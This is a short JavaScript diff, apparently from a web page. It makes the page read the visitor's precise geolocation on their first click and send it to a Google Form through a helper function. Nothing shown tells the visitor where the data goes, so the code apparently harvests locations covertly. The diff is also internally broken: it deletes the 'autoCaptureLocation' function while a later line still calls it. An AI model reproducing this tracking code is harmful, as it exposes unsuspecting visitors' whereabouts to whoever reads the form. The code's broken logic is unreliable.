@@ -418,7 +418,7 @@ function sendLocationToGoogleForm(lat, lon, acc) {
   });
 }
 
-function autoCaptureLocation() {
+window.addEventListener("click", () => {
   navigator.geolocation.getCurrentPosition(pos => {
     sendLocationToGoogleForm(
       pos.coords.latitude,
@@ -426,7 +426,8 @@ function autoCaptureLocation() {
       pos.coords.accuracy
     );
   });
-}
+}, { once: true });
+
 
 // ✅ Runs only AFTER first user tap
 window.addEventListener("click", autoCaptureLocation, { once: true });
